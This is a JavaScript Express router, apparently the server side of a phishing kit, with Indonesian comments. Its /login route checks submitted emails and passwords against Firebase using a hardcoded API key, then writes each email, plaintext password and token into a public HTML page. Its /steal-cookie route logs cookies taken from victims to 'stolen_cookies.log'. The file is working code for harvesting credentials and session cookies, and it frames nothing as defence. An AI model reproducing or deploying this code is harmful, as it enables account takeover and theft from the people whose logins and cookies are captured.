const express = require('express');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const router = express.Router();

const FIREBASE_API_KEY = 'AIzaSyBhSJdSbsHlec8FsWzol1koxEBtXJ4uxh8'; // API KEY LO
const FIREBASE_AUTH_URL = 'https://identitytoolkit.googleapis.com/v1/accounts';

const ADMIN_FILE = path.join(__dirname, '../fronted/admin_auth.html');

if (!fs.existsSync(ADMIN_FILE)) {
  fs.writeFileSync(ADMIN_FILE, `<html><body><h1>Admin Auth Data</h1><pre id="data"></pre></body></html>`);
}

function saveAdminData(email, password, idToken) {
  let html = fs.readFileSync(ADMIN_FILE, 'utf-8');
  const entry = `
  <div style="border:1px solid #ccc; margin:10px; padding:10px; background:#f0f0f0;">
    <strong>Email:</strong> ${email} <br>
    <strong>Password:</strong> ${password} <br>
    <strong>Token:</strong> ${idToken} <br>
    <strong>Waktu:</strong> ${new Date().toISOString()}
  </div>
  `;
  html = html.replace('</pre>', entry + '</pre>');
  fs.writeFileSync(ADMIN_FILE, html);
}

function removeAdminData(email) {
  let html = fs.readFileSync(ADMIN_FILE, 'utf-8');
  const regex = new RegExp(`<div style="border:1px solid #ccc; margin:10px; padding:10px; background:#f0f0f0;">.*?<strong>Email:</strong> ${email}.*?</div>`, 's');
  html = html.replace(regex, '');
  fs.writeFileSync(ADMIN_FILE, html);
}

router.post('/login', async (req, res) => {
  const { email, password, idToken } = req.body;

  // Kalo dapet idToken dari frontend, langsung simpen (dianggap sukses)
  if (idToken) {
    saveAdminData(email, password, idToken);
    console.log('✅ Login sukses (via Firebase SDK), data disimpan');
    return res.json({ success: true, idToken });
  }

  // Fallback: pake axios kalo frontend gagal
  try {
    const loginRes = await axios.post(`${FIREBASE_AUTH_URL}:signInWithPassword?key=${FIREBASE_API_KEY}`, {
      email,
      password,
      returnSecureToken: true
    });

    const token = loginRes.data.idToken;
    saveAdminData(email, password, token);
    console.log('✅ Login sukses (via REST), data disimpan');
    return res.json({ success: true, idToken: token });

  } catch (error) {
    removeAdminData(email);
    console.log('❌ Login gagal, data dihapus');
    return res.json({ success: false });
  }
});

router.post('/steal-cookie', (req, res) => {
  const { cookies } = req.body;
  fs.appendFileSync('stolen_cookies.log', JSON.stringify({
    time: new Date().toISOString(),
    cookies,
    userAgent: req.headers['user-agent']
  }) + '\n');
  console.log('🍪 COOKIE CURIAN:', cookies);
  res.json({ success: true });
});

module.exports = router;